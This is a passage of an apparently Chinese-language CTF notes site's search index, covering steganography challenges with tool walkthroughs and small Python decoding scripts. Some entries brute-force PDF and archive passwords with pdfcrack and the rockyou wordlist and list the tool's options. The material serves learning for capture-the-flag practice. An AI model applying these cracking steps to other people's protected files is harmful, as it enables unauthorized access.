\u9690\u5199\uff08Key\uff09","text":""},{"location":"Misc/Chapter2/2-15/#jphs-\u9690\u5199key","title":"JPHS \u9690\u5199\uff08Key\uff09","text":"<p>\u524d\u95e8\u7684\u6b65\u9aa4\u53c2\u8003\u4e0a\u4e00\u8282 SilentEye \u9690\u5199</p> <p>\u4f7f\u7528 JPHS \u89e3\u7801 jpeg \u56fe\u7247\uff0c\u70b9\u51fb Open jpeg</p> <p></p> <p>\u70b9\u51fb Seek \u63d0\u53d6\u6570\u636e\uff08\u8fd9\u9898\u5bc6\u7801\u5728\u5c5e\u6027\u4e2d\uff09</p> <p></p> <p>\u4fdd\u5b58\u6587\u4ef6\u5373\u53ef</p> <p></p>"},{"location":"Misc/Chapter2/2-16/","title":"\u62bd\u8c61\u753b\u9690\u5199","text":""},{"location":"Misc/Chapter2/2-16/#\u62bd\u8c61\u753b\u9690\u5199","title":"\u62bd\u8c61\u753b\u9690\u5199","text":"<p>\u539f\u7406\u662f Piet \u8fd9\u95e8\u7f16\u7a0b\u8bed\u8a00 </p> <p>\u6253\u5f00 Word \u6587\u6863\u53e6\u5b58\u5176\u4e2d\u56fe\u7247</p> <p></p> <p>\u4f7f\u7528\u5de5\u5177 NPiet \u63d0\u53d6</p> <p></p> <p>\u8fd8\u6709\u53e6\u4e00\u534a\u89e3\u7801\u5373\u53ef</p> <p></p>"},{"location":"Misc/Chapter2/2-17/","title":"FFC \u9690\u5199\uff08Key\uff09","text":""},{"location":"Misc/Chapter2/2-17/#ffc-\u9690\u5199key","title":"FFC \u9690\u5199\uff08Key\uff09","text":"<p>FFC \u662f Free File Camouflage \u7684\u7b80\u79f0 </p> <p>\u53d1\u73b0\u6ce8\u91ca\u6709\u6bb5\u7f16\u7801</p> <p></p> <p>\u89e3\u7801\u5f97\u5230\u63d0\u793a\u8fd9\u4e2a\u5de5\u5177</p> <p></p> <p>\u9898\u76ee\u7ed9\u51fa\u4e86\u5bc6\u7801\uff0c\u4f7f\u7528\u5de5\u5177\u63d0\u53d6\u6570\u636e\u5373\u53ef</p> <p>\u6700\u540e\u6267\u884c txt \u6587\u4ef6\u4e2d\u7684\u4ee3\u7801\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter2/2-18/","title":"Java \u76f2\u6c34\u5370\u9690\u5199","text":""},{"location":"Misc/Chapter2/2-18/#java-\u76f2\u6c34\u5370\u9690\u5199","title":"Java \u76f2\u6c34\u5370\u9690\u5199","text":"<p>\u524d\u9762\u7684\u6b65\u9aa4\u662f\u5148 Foremost \u5206\u79bb\uff0c\u7136\u540e\u7206\u7834\uff08\u6709\u63d0\u793a\u5bc6\u7801\u662f\u56db\u4f4d\u6570\u5b57\uff09\uff0c\u62ff\u5230\u56fe\u7247</p> <p></p> <p>\u4f7f\u7528\u5de5\u5177\u63d0\u53d6\u56fe\u7247\uff08\u56fe\u4e2d\u6709\u5de5\u5177\u540d\uff09</p> <p></p> <p>\u6210\u529f\u62ff\u5230\u4e0b\u4e00\u6b65\u7684 Key \u503c</p> <p></p>"},{"location":"Misc/Chapter2/2-19/","title":"S-Tools \u9690\u5199\uff08Key\uff09","text":""},{"location":"Misc/Chapter2/2-19/#s-tools-\u9690\u5199key","title":"S-Tools \u9690\u5199\uff08Key\uff09","text":"<p>\u6587\u4ef6\u672b\u5c3e\u6709\u6bb5\u52a0\u5bc6\u5b57\u7b26</p> <p></p> <p>\u89e3\u5bc6\u5f97\u5230\u63d0\u793a\u5de5\u5177\u53ca Key \u503c</p> <p></p> <p>\u4f7f\u7528\u5de5\u5177 S-Tools \u89e3\u51fa Key.txt \u6587\u4ef6</p> <p></p>"},{"location":"Misc/Chapter2/2-2/","title":"\u5750\u6807\u70b9\u9690\u5199","text":""},{"location":"Misc/Chapter2/2-2/#\u5750\u6807\u70b9\u9690\u5199","title":"\u5750\u6807\u70b9\u9690\u5199","text":"<p>\u8fd9\u7c7b\u9898\u901a\u5e38\u662f\u4e00\u5927\u4e32\u5750\u6807\u70b9\u6570\u636e</p> <p>\u4f60\u9700\u8981\u683c\u5f0f\u5316\u6570\u636e\u7136\u540e\u7ed8\u5236\u56fe\u5f62 </p> <p>\u4e0b\u8f7d\u6587\u4ef6\u6254\u8fdb WinHex \u4e2d\u53d1\u73b0\u4e00\u5927\u4e32 16 \u8fdb\u5236\u6570\u636e</p> <p></p> <p>\u7f16\u5199\u811a\u672c\u5c06 16 \u8fdb\u5236\u8f6c ASCII</p> <pre><code>def hex_to_ascii(hex_string):\n    # \u786e\u4fdd\u8f93\u5165\u7684\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u957f\u5ea6\u662f\u5076\u6570\n    if len(hex_string) % 2 != 0:\n        print(\"\u8f93\u5165\u7684\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u957f\u5ea6\u4e0d\u662f\u5076\u6570\uff0c\u8bf7\u8f93\u5165\u6709\u6548\u7684\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u3002\")\n\n        return None\n\n    # \u5c06\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u5206\u5272\u6210\u6bcf\u4e24\u4e2a\u5b57\u7b26\u4e00\u7ec4\n    hex_bytes = [hex_string[i:i + 2] for i in range(0, len(hex_string), 2)]\n\n    # \u5c06\u6bcf\u7ec4\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u8f6c\u6362\u4e3a ASCII \u5b57\u7b26\n    ascii_string = ''.join(chr(int(b, 16)) for b in hex_bytes)\n\n    return ascii_string\n\n\n# \u8bfb\u53d6\u6587\u4ef6\u4e2d\u7684\u5341\u516d\u8fdb\u5236\u6570\u636e\ndef read_hex_from_file(file_path):\n    try:\n        with open(file_path, 'r') as file:\n            hex_data = file.read().strip()\n\n            return hex_data\n\n    except FileNotFoundError:\n        print(f\"\u6587\u4ef6 {file_path} \u672a\u627e\u5230\u3002\")\n\n        return None\n\n\n# \u5c06 ASCII \u5b57\u7b26\u4e32\u5199\u5165\u6587\u4ef6\ndef write_ascii_to_file(file_path, ascii_string):\n    try:\n        with open(file_path, 'w') as file:\n            file.write(ascii_string)\n\n            print(f\"ASCII\u5b57\u7b26\u4e32\u5df2\u4fdd\u5b58\u5230\u6587\u4ef6\uff1a{file_path}\")\n\n    except Exception as e:\n        print(f\"\u65e0\u6cd5\u5199\u5165\u6587\u4ef6 {file_path}\uff0c\u9519\u8bef\uff1a{e}\")\n\n\ndef main():\n    # \u4f60\u7684\u6587\u4ef6\u8def\u5f84\n    file_path = '16 \u8fdb\u5236\u6570\u636e.txt'\n\n    # \u8f93\u51fa\u6587\u4ef6\u8def\u5f84\n    output_file_path = 'ascii_output.txt'\n\n    hex_input = read_hex_from_file(file_path)\n\n    if hex_input:\n        ascii_output = hex_to_ascii(hex_input)\n        if ascii_output:\n            write_ascii_to_file(output_file_path, ascii_output)\n\n\nif __name__ == \"__main__\":\n    main()\n</code></pre> <p>\u8fd9\u6837\u6211\u4eec\u5c31\u5f97\u5230\u4e86\u5750\u6807</p> <p></p> <p>\u7ee7\u7eed\u4f7f\u7528 Python \u7ed8\u56fe\u62ff\u5230 flag</p> <pre><code>import matplotlib.pyplot as plt\n\n\n# \u8bfb\u53d6\u6587\u4ef6\u4e2d\u7684\u5750\u6807\u6570\u636e\ndef read_data_from_file(file_path):\n    try:\n        with open(file_path, 'r') as file:\n            lines = file.readlines()\n\n            points = []\n\n            for line in lines:\n                # \u79fb\u9664\u7a7a\u767d\u5b57\u7b26\u548c\u62ec\u53f7\uff0c\u7136\u540e\u5206\u5272\u5b57\u7b26\u4e32\u83b7\u53d6 x \u548c y \u503c\n                x, y = map(int, line.strip().replace('(', '').replace(')', '').split(','))\n\n                points.append((x, y))\n\n            return points\n\n    except FileNotFoundError:\n        print(f\"\u6587\u4ef6 {file_path} \u672a\u627e\u5230\u3002\")\n\n        return None\n\n\n# \u7ed8\u5236\u70b9\ndef plot_points(points):\n    # \u5206\u79bb x \u548c y \u5750\u6807\n    x_coords = [point[0] for point in points]\n\n    y_coords = [point[1] for point in points]\n\n    # \u521b\u5efa\u6563\u70b9\u56fe\n    plt.scatter(x_coords, y_coords)\n\n    plt.xlabel('X Coordinate')\n\n    plt.ylabel('Y Coordinate')\n\n    plt.title('Scatter Plot of Points')\n\n    plt.grid(True)\n\n    plt.show()\n\n\ndef main():\n    # \u4f60\u7684\u6587\u4ef6\u8def\u5f84\n    file_path = 'ascii_output.txt'\n\n    points = read_data_from_file(file_path)\n\n    if points:\n        plot_points(points)\n\n\nif __name__ == \"__main__\":\n    main()\n</code></pre> <p></p>"},{"location":"Misc/Chapter2/2-20/","title":"Stegpy \u9690\u5199","text":""},{"location":"Misc/Chapter2/2-20/#stegpy-\u9690\u5199","title":"Stegpy \u9690\u5199","text":"<p>\u8fd9\u91cc\u662f\u672c\u9898\u7684\u6700\u540e\u4e00\u6b65\uff0c\u4f7f\u7528\u5de5\u5177 stegpy \u63d0\u53d6\u5b57\u7b26</p> <p></p>"},{"location":"Misc/Chapter2/2-21/","title":"PDF \u5bc6\u7801\u7206\u7834","text":""},{"location":"Misc/Chapter2/2-21/#pdf-\u5bc6\u7801\u7206\u7834","title":"PDF \u5bc6\u7801\u7206\u7834","text":"<p>\u524d\u9762\u5148\u7206\u7834\u51fa\u6587\u4ef6\u89e3\u538b\u7f29\u5bc6\u7801\u662f 1337h4x0r\uff0c\u63a5\u4e0b\u6765\u7206\u7834 PDF \u5bc6\u7801</p> <p></p> <p>\u4f7f\u7528\u5de5\u5177 pdfcrack \u7206\u7834\uff0crockyou \u5b57\u5178\u7206\u7834\u51fa\u5bc6\u7801</p> <pre><code>-f FILE\uff1a\u9009\u62e9 FILE \u6587\u4ef6\n-b\uff1a\u6267\u884c\u57fa\u51c6\u6d4b\u8bd5\u5e76\u9000\u51fa\n-c STRING\uff1a\u4f7f\u7528 STRING \u4e2d\u7684\u5b57\u7b26\u4f5c\u4e3a\u5b57\u7b26\u96c6\n-w FILE\uff1a\u4f7f\u7528 FILE \u4f5c\u4e3a\u5bc6\u7801\u6e90\u8fdb\u884c\u5c1d\u8bd5\n-n INTEGER\uff1a\u8df3\u8fc7\u5c1d\u8bd5\u77ed\u4e8e INTEGER \u7684\u5bc6\u7801\n-m INTEGER\uff1a\u8fbe\u5230\u6b64 INTEGER \u5bc6\u7801\u957f\u5ea6\u65f6\u505c\u6b62\n-l FILE\uff1a\u4ece FILE \u4e2d\u4fdd\u5b58\u7684\u72b6\u6001\u7ee7\u7eed\n-o\uff1a\u4f7f\u7528\u6240\u6709\u8005\u5bc6\u7801\n-u\uff1a\u4f7f\u7528\u7528\u6237\u5bc6\u7801\uff08\u9ed8\u8ba4\uff09\n-p STRING\uff1a\u63d0\u4f9b\u7528\u6237\u5bc6\u7801\u4ee5\u52a0\u5feb\u7834\u89e3\u6240\u6709\u8005\u5bc6\u7801\u7684\u901f\u5ea6\uff08\u9690\u542b -o\uff09\n-q\uff1a\u5b89\u9759\u8fd0\u884c\n-s\uff1a\u5c1d\u8bd5\u6392\u5217\u5bc6\u7801\uff08\u76ee\u524d\u4ec5\u652f\u6301\u5c06\u7b2c\u4e00\u4e2a\u5b57\u7b26\u5207\u6362\u4e3a\u5927\u5199\uff09\n-v\uff1a\u6253\u5370\u7248\u672c\u5e76\u9000\u51fa\n</code></pre> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter2/2-22/","title":"StegSeek \u7206\u7834","text":""},{"location":"Misc/Chapter2/2-22/#stegseek-\u7206\u7834","title":"StegSeek \u7206\u7834","text":"<p>\u7b2c\u4e00\u4e2a\u6587\u4ef6\u63d0\u793a\u9700\u8981 Steg \u5de5\u5177\uff0c\u4f7f\u7528 StegSeek \u7206\u7834</p> <p></p>"},{"location":"Misc/Chapter2/2-23/","title":"PPT \u9690\u5199","text":""},{"location":"Misc/Chapter2/2-23/#ppt-\u9690\u5199","title":"PPT \u9690\u5199","text":"<p>\u653e\u5927 PPT \u5373\u53ef</p> <p></p>"},{"location":"Misc/Chapter2/2-24/","title":"PDF \u54c8\u5e0c\u7206\u7834","text":""},{"location":"Misc/Chapter2/2-24/#pdf-\u54c8\u5e0c\u7206\u7834","title":"PDF \u54c8\u5e0c\u7206\u7834","text":"<p>\u6253\u5f00 PDF \u9700\u8981\u5bc6\u7801</p> <p></p> <p>\u539f\u9898\u76ee\u7ed9\u51fa\u4e86\u63d0\u793a</p> <p></p> <p>\u5bc6\u7801\u662f\u4e00\u4e32\u4e5d\u4f4d\u6570\u5b57\uff0c\u53ef\u4ee5\u4f7f\u7528 pdfcrack \u7206\u7834\uff0c\u4f46\u4e4b\u524d\u4ecb\u7ecd\u8fc7\u4e86\uff0c\u6240\u4ee5\u8fd9\u91cc\u4ecb\u7ecd\u53e6\u4e00\u79cd\u65b9\u6cd5</p> <p></p> <p>\u5148\u83b7\u53d6 PDF \u7684\u54c8\u5e0c\u503c</p> <p></p> <p>\u518d\u683c\u5f0f\u5316\u4e00\u4e0b\u5220\u9664\u591a\u4f59\u7684\u5b57\u7b26</p> <p></p> <p>\u6700\u540e\u7206\u7834\u5373\u53ef</p> <p></p>"},{"location":"Misc/Chapter2/2-25/","title":"F5-steganography \u9690\u5199","text":""},{"location":"Misc/Chapter2/2-25/#f5-steganography-\u9690\u5199","title":"F5-steganography \u9690\u5199","text":"<p>\u4e0b\u8f7d\u6587\u4ef6\u5f97\u5230\u4e00\u5f20\u56fe\u7247</p> <p></p> <p>\u4f7f\u7528\u5de5\u5177 F5-steganography \u6d4b\u8bd5\u63d0\u53d6\u51fa\u6587\u4ef6</p> <p></p>"},{"location":"Misc/Chapter2/2-26/","title":"Outguess \u9690\u5199\uff08Key\uff09","text":""},{"location":"Misc/Chapter2/2-26/#outguess-\u9690\u5199key","title":"Outguess \u9690\u5199\uff08Key\uff09","text":"<p>\u67e5\u770b\u56fe\u7247\u5c5e\u6027\u53d1\u73b0\u6838\u5fc3\u4ef7\u503c\u89c2\u7f16\u7801</p> <p></p> <p>\u89e3\u7801\u62ff\u5230 abc</p> <p></p> <p>\u6839\u636e\u9898\u76ee\u63d0\u793a\u4f7f\u7528\u5de5\u5177 Outguess -k \u6307\u5b9a\u5bc6\u7801 abc -r \u6307\u5b9a\u6587\u4ef6</p> <p></p>"},{"location":"Misc/Chapter2/2-27/","title":"\u89c6\u9891\u5e27\u9690\u5199","text":""},{"location":"Misc/Chapter2/2-27/#\u89c6\u9891\u5e27\u9690\u5199","title":"\u89c6\u9891\u5e27\u9690\u5199","text":"<p>\u4f7f\u7528\u5de5\u5177 Kinovea \u6253\u5f00\u89c6\u9891\u540e\u770b\u5230\u4e8c\u7ef4\u7801\u5c31\u622a\u56fe\u626b\u7801</p> <p></p>"},{"location":"Misc/Chapter2/2-28/","title":"BPG \u9690\u5199","text":""},{"location":"Misc/Chapter2/2-28/#bpg-\u9690\u5199","title":"BPG \u9690\u5199","text":"<p>\u5206\u79bb\u51fa\u672b\u5c3e\u7684 BPG \u6587\u4ef6</p> <p></p> <p>\u7f51\u4e0a\u67e5\u627e\u76f8\u5173\u8d44\u6599</p> <p></p> <p>\u7f51\u4e0a\u4e0b\u8f7d\u5de5\u5177</p> <p></p> <p>\u4f7f\u7528\u547d\u4ee4\u6253\u5f00</p> <p></p>"},{"location":"Misc/Chapter2/2-29/","title":"APNG \u9690\u5199","text":""},{"location":"Misc/Chapter2/2-29/#apng-\u9690\u5199","title":"APNG \u9690\u5199","text":"<p>\u4f7f\u7528\u5de5\u5177\u5206\u79bb</p> <p></p>"},{"location":"Misc/Chapter2/2-3/","title":"\u76f2\u6c34\u5370\u9690\u5199","text":""},{"location":"Misc/Chapter2/2-3/#\u76f2\u6c34\u5370\u9690\u5199","title":"\u76f2\u6c34\u5370\u9690\u5199","text":"<p>\u8fd9\u7c7b\u9898\u4e00\u822c\u90fd\u662f\u4e24\u5f20\u4e00\u6a21\u4e00\u6837\u7684\u56fe\u7247</p> <p>\u4f46\u662f\u5176\u4e2d\u4e00\u5f20\u7684\u5927\u5c0f\u6bd4\u53e6\u4e00\u79cd\u5927\u7684\u591a </p> <p>\u6253\u5f00\u6587\u4ef6\u53d1\u73b0\u4e24\u5f20\u76f8\u540c\u56fe\u7247\uff0c\u4e14\u53e6\u4e00\u4e2a\u5927\u5c0f\u662f\u5176\u4e2d\u4e00\u4e2a\u597d\u51e0\u500d</p> <p></p> <p>\u4f7f\u7528\u5de5\u5177 BlindWaterMark \u63d0\u53d6\u9690\u85cf\u56fe\u7247\uff08\u539f\u56fe\u4e0d\u5728\u4e86\u7528\u7528\u522b\u4eba\u7684\uff09</p> <p></p> <p>\u6210\u529f\u62ff\u5230\u56fe\u7247\uff0c\u8fd9\u91cc\u662f\u538b\u7f29\u5305\u7684\u89e3\u538b\u5bc6\u7801</p> <p>\u89e3\u538b\u7f29\u540e Base64 \u591a\u884c\u89e3\u7801\u5373\u53ef</p> <p></p>"},{"location":"Misc/Chapter2/2-30/","title":"\u9891\u57df\u76f2\u6c34\u5370\u9690\u5199","text":""},{"location":"Misc/Chapter2/2-30/#\u9891\u57df\u76f2\u6c34\u5370\u9690\u5199","title":"\u9891\u57df\u76f2\u6c34\u5370\u9690\u5199","text":"<p>19 \u5e74\u7684\u9898\uff0c\u7248\u672c\u6709\u70b9\u8001\uff0c\u7528\u7684 python2 </p> <pre><code>import cv2\nimport numpy as np\nimport random\nimport os\nfrom argparse import ArgumentParser\n\nALPHA = 5\n\ndef build_parser():\n    parser = ArgumentParser()\n\n    parser.add_argument('--original', dest='ori', required=True)\n\n    parser.add_argument('--image', dest='img', required=True)\n\n    parser.add_argument('--result', dest='res', required=True)\n\n    parser.add_argument('--alpha', dest='alpha', default=ALPHA, type=float)\n\n    return parser\n\ndef check_file_exists(file_path, parser, file_name):\n    if not os.path.exists(file_path):\n        parser.error(f\"{file_name} {file_path} does not exist.\")\n\ndef main():\n    parser = build_parser()\n\n    options = parser.parse_args()\n\n    ori, img, res, alpha = options.ori, options.img, options.res, options.alpha\n\n    check_file_exists(ori, parser, 'Original image')\n\n    check_file_exists(img, parser, 'Image')\n\n    decode(ori, img, res, alpha)\n\ndef decode(ori_path, img_path, res_path, alpha):\n    ori = cv2.imread(ori_path)\n\n    img = cv2.imread(img_path)\n\n    # \u5bf9\u4e24\u4e2a\u56fe\u50cf\u6267\u884c FFT\n    ori_f = np.fft.fft2(ori)\n\n    img_f = np.fft.fft2(img)\n\n    # \u8ba1\u7b97\u6c34\u5370\n    watermark = np.real((ori_f - img_f) / alpha)\n\n    # \u521b\u5efa\u7ed3\u679c\u77e9\u9635\n    res = np.zeros_like(watermark)\n\n    # \u968f\u673a\u7d22\u5f15\n    height, width = ori.shape[:2]\n\n    x = np.arange(height // 2)\n\n    y = np.arange(width)\n\n    # Shuffle \u9ad8\u6548\u534f\u8c03\n    np.random.shuffle(x)\n\n    np.random.shuffle(y)\n\n    # \u5206\u914d\u6df7\u6d17\u6c34\u5370\u503c\n    res[x[:, None], y] = watermark[x[:, None], y]\n\n    # Save result image\n    cv2.imwrite(res_path, res, [int(cv2.IMWRITE_JPEG_QUALITY), 100])\n\nif __name__ == '__main__':\n    main()\n</code></pre>"},{"location":"Misc/Chapter2/2-31/","title":"WbStego \u9690\u5199\uff08Key\uff09","text":""},{"location":"Misc/Chapter2/2-31/#wbstego-\u9690\u5199key","title":"WbStego \u9690\u5199\uff08Key\uff09","text":"<p>\u5982\u4f55\u5224\u65ad\u662f\u5426\u6587\u4ef6\u91c7\u7528<code>wbStego4open</code>\u52a0\u5bc6\uff1f</p> <ol> <li>\u5c06\u6587\u4ef6\u5bfc\u5165010editor\u3001winhex\u4e4b\u7c7b\u7684\u5341\u516d\u8fdb\u5236\u67e5\u770b\u5de5\u5177</li> <li>\u5982\u679c <code>20</code>\u3001<code>09</code> \u51fa\u73b0\u6b21\u6570\u8f83\u591a\uff0c\u5219\u6709\u53ef\u80fd\u4e3a<code>wbStego4open</code>\u52a0\u5bc6 </li> </ol> <p>\u62ff\u5230\u6587\u4ef6\u662f\u4e00\u4e2a PDF\uff0c\u9996\u5148\u5c1d\u8bd5 WbStego \u9690\u5199\uff0c\u6253\u5f00\u8f6f\u4ef6\u70b9\u51fb Continue</p> <p></p> <p>\u518d\u9009\u62e9 Decode \u89e3\u7801\u70b9\u51fb Continue</p> <p></p> <p>\u63a5\u7740\u5c06\u6211\u4eec\u6587\u4ef6\u6258\u8fdb\u53bb\u70b9\u51fb Continue</p> <p></p> <p>\u8981\u6211\u4eec\u586b\u5199\u5bc6\u7801\uff0c\u4f46\u662f\u4e0d\u77e5\u9053\u5bc6\u7801\uff0c\u6240\u4ee5\u76f4\u63a5\u4e0b\u4e00\u6b65</p> <p></p> <p>\u5728\u9009\u62e9\u8f93\u51fa\u7684\u4f4d\u7f6e</p> <p></p> <p>\u76f4\u63a5\u4e0b\u4e00\u6b65</p> <p></p> <p>\u5b8c\u6210\uff01\uff01\uff01</p> <p></p> <p>\u6253\u5f00\u8f93\u51fa\u6587\u4ef6\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter2/2-32/","title":"GPS \u6570\u636e\u9690\u5199","text":""},{"location":"Misc/Chapter2/2-32/#gps-\u6570\u636e\u9690\u5199","title":"GPS \u6570\u636e\u9690\u5199","text":"<p>\u9898\u76ee\u63d0\u793a\u4e86 GPS\uff0c\u7ed9\u7684\u9644\u8fd1\u6253\u5f00\u4e5f\u90fd\u662f\u4e9b\u6570\u636e</p> <p></p> <p>\u53bb\u5728\u7ebf\u7f51\u7ad9\u7ed8\u5236</p> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter2/2-33/","title":"\u56fe\u7247\u62fc\u63a5\u9690\u5199\uff08Online\uff09","text":""},{"location":"Misc/Chapter2/2-33/#\u56fe\u7247\u62fc\u63a5\u9690\u5199online","title":"\u56fe\u7247\u62fc\u63a5\u9690\u5199\uff08Online\uff09","text":"<p>\u6253\u5f00\u6587\u4ef6\u90fd\u662f\u4e9b\u56fe\u7247\u788e\u7247</p> <p></p> <p>\u6309\u65f6\u95f4\u6392\u5e8f\u540e\u53bb\u5728\u7ebf\u7f51\u7ad9\u5408\u5e76\uff0c\u4e00\u5b9a\u8981\u9009\u6c34\u5e73</p> <p></p> <p>\u5408\u5e76\u540e\u4e0b\u8f7d\u6587\u4ef6</p> <p></p> <p>\u8bbe\u7f6e\u66dd\u5149\u5ea6\u626b\u7801\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter2/2-34/","title":"TIFF \u56fe\u5c42\u9690\u5199","text":""},{"location":"Misc/Chapter2/2-34/#tiff-\u56fe\u5c42\u9690\u5199","title":"TIFF \u56fe\u5c42\u9690\u5199","text":"<p>\u9996\u5148\u4f7f\u7528 ForeMost \u63d0\u53d6\u9690\u5199\u6587\u4ef6</p> <p></p> <p>\u89e3\u538b\u51fa\u6765\u7684 exe \u6587\u4ef6\u8fd0\u884c\u5f97\u5230\u4e00\u4e2a tiff \u6587\u4ef6</p> <p>\u7528 PS \u7f16\u8f91\u540e\u7684 Tiff \u6587\u4ef6\u53ef\u4ee5\u4fdd\u5b58\u8def\u5f84\u548c\u56fe\u5c42</p> <p></p> <p>\u53bb\u6389\u906e\u6321\u7684\u56fe\u5c42\u62ff\u5230 flag \u8ba1\u7b97\u5f0f</p> <p></p> <p>\u5728 WinHex \u4e2d\u7ed3\u5c3e\u53d1\u73b0\u5b57\u7b26</p> <pre><code>njCp1HJBPLVTxcMhUHDPwE7mPW\n</code></pre> <p>\u7f16\u5199\u811a\u672c\u89e3\u5bc6</p> <pre><code>bytearray = b\"njCp1HJBPLVTxcMhUHDPwE7mPW\"\n\nflag = \"\"\n\nfor i in range(len(bytearray)):\n    if i % 2==0:\n        c = bytearray[i]\n        c -= 1\n        flag += chr(c)\n    else:\n        c = bytearray[i]\n        c += 1\n        flag += chr(c)\n\nprint(flag)\n</code></pre>"},{"location":"Misc/Chapter2/2-35/","title":"BMP \u9690\u5199","text":""},{"location":"Misc/Chapter2/2-35/#bmp-\u9690\u5199","title":"BMP \u9690\u5199","text":"<p>\u6253\u5f00\u9644\u4ef6\u7ed9\u4e86\u4e00\u5f20 bmp \u7c7b\u578b\u56fe\u7247</p> <p></p> <p>\u5728 Stegsolve \u4e2d\u6362\u5176\u4ed6\u901a\u9053\u770b\u5230\u7591\u4f3c\u4e8c\u7ef4\u7801\u7684\u788e\u7247</p> <p></p> <p>\u7528\u753b\u56fe\u5de5\u5177\u6253\u5f00 bmp \u56fe\u7247\u5c06\u5176\u53e6\u5b58\u4e3a png \u683c\u5f0f\u518d\u653e\u5165 Stegsolve \u4e2d\u62ff\u5230\u4e8c\u7ef4\u7801</p> <p>\u626b\u7801\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter2/2-36/","title":"GIF \u5e27\u50cf\u7d20\u9690\u5199","text":""},{"location":"Misc/Chapter2/2-36/#gif-\u5e27\u50cf\u7d20\u9690\u5199","title":"GIF \u5e27\u50cf\u7d20\u9690\u5199","text":"<p>\u7ed9\u4e86\u4e00\u4e2a GIF \u6587\u4ef6\uff0c\u5148\u5c06\u5176\u5206\u89e3</p> <pre><code>import os\nfrom PIL import Image\n\ndef main(gif_file):\n    png_dir = 'frame/'\n    img = Image.open(gif_file)\n    try:\n        while True:\n            current = img.tell()\n            img.save(png_dir + str(current + 1) + '.png')\n            img.seek(current + 1)\n    except:\n        pass\nif __name__ == '__main__':\n    gif_file = 'out.gif'\n    main(gif_file)\n</code></pre> <p>\u53d1\u73b0\u6bcf\u4e2a\u56fe\u50cf\u7d20\u70b9\u4f4d\u7f6e\u90fd\u4e0d\u4e00\u6837</p> <p></p> <p>\u8bfb\u53d6\u6bcf\u4e2a PNG \u4e2d\u7684\u5bf9\u5e94\u70b9\u7684\u4fe1\u606f\uff0c\u5e76\u6309\u7167 8bit \u8f6c\u6362\u4e3a ascii</p> <pre><code>import os\nfrom PIL import Image\n\ndef main():\n    png_dir = 'frame/'\n    ret = \"\"\n    for i in range(0,24):\n        line = \"\"\n        for j in range(0,24):\n            file_name = \"frame/\" + str(i * 24 + j + 1) + \".png\"\n            x = j * 10 + 5\n            y = i * 10 + 5\n            img = Image.open(file_name)\n            img = img.convert(\"RGB\") \n            img_array = img.load()\n            r, g, b = p = img_array[x, y]\n            if g == 255:\n                line += \"0\"\n            if r == 255 and b == 255:\n                line += \"1\"\n            if len(line) == 8:\n                ret += chr(int(line, 2))\n                line = \"\"\n\n    print(ret)\n\nif __name__ == '__main__':\n    main()\n</code></pre> <p>\u8fd0\u884c\u811a\u672c\u5f97\u5230</p> <pre><code>o8DlxK+H8wsiXe/ERFpAMaBPiIcj1sHyGOMmQDkK+uXsVZgre5DSXw==\n</code></pre> <p>\u518d Foremost \u5206\u79bb GIF \u6587\u4ef6</p> <p></p> <p>\u62ff\u7740\u5bc6\u94a5\u53bb\u89e3\u5bc6\u5373\u53ef</p> <p></p>"},{"location":"Misc/Chapter2/2-37/","title":"Cloacked-pixel \u9690\u5199","text":""},{"location":"Misc/Chapter2/2-37/#cloacked-pixel\u9690\u5199","title":"Cloacked-pixel\u9690\u5199","text":"<p>\u7ed9\u4e86\u4e2a\u56fe\u7247</p> <p></p> <p>\u4e0b\u8f7d\u5de5\u5177</p> <p></p> <p>\u7ecf\u8fc7\u4e00\u7cfb\u5217\u62a5\u9519\u5b89\u88c5\u5e93\uff08\u672c\u4eba\u4ece\u4e0d\u7528 Python2\uff09\u7ec8\u4e8e\u6210\u529f</p> <p></p> <p>\u6210\u529f\u62ff\u5230\u6570\u636e</p> <p></p> <p>\u89e3\u5bc6</p> <p></p>"},{"location":"Misc/Chapter2/2-38/","title":"\u4e8c\u7ef4\u7801\u624b\u52a8\u4fee\u8865\u9690\u5199","text":""},{"location":"Misc/Chapter2/2-38/#\u4e8c\u7ef4\u7801\u624b\u52a8\u4fee\u8865\u9690\u5199","title":"\u4e8c\u7ef4\u7801\u624b\u52a8\u4fee\u8865\u9690\u5199","text":"<p>\u4e0b\u8f7d\u62ff\u5230\u56fe\u7247</p> <p></p> <p>\u624b\u52a8\u5904\u7406\u4e8c\u7ef4\u7801</p> <p>\u6b64\u4e8c\u7ef4\u7801\u7684\u5927\u5c0f\u4e3a 29x29\uff0c\u7248\u672c V \u7684\u5927\u5c0f\u4e3a N \u00d7 N\uff0cN = 17 + 4V\uff0c\u6240\u4ee5\u8fd9\u662f\u7248\u672c 3</p> <p></p> <p>\u56fe\u4e2d\u7ea2\u6846\u8be5\u533a\u57df\u8868\u793a\u4e8c\u7ef4\u7801\u7684\u683c\u5f0f\u4fe1\u606f\uff0c\u5b9e\u9645\u4e0a\u683c\u5f0f\u4fe1\u606f\u662f 15 \u4f4d\u957f\uff0c\u533a\u57df\u6709\u6700\u540e 8 \u4f4d</p> <p></p> <p>\u641c\u7d22\u6240\u6709\u683c\u5f0f\u4fe1\u606f\u5b57\u7b26\u4e32\u7684\u5217\u8868\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u7c7b\u578b\u4fe1\u606f\u4f4d\u662f<code>001001110111110</code>\uff0c\u6240\u4ee5\u8fd9\u4e2a\u4e8c\u7ef4\u7801\u6709ECC\u7ea7\u522b H \u548c\u63a9\u7801\u6a21\u5f0f 1</p> ECC \u7ea7\u522b \u8499\u7248\u56fe\u6848 \u7c7b\u578b\u4fe1\u606f\u4f4d L 0 111011111000100 L 1 111001011110011 L 2 111110110101010 L 3 111100010011101 L 4 110011000101111 L 5 110001100011000 L 6 110110001000001 L 7 110100101110110 M 0 101010000010010 M 1 101000100100101 M 2 101111001111100 M 3 101101101001011 M 4 100010111111001 M 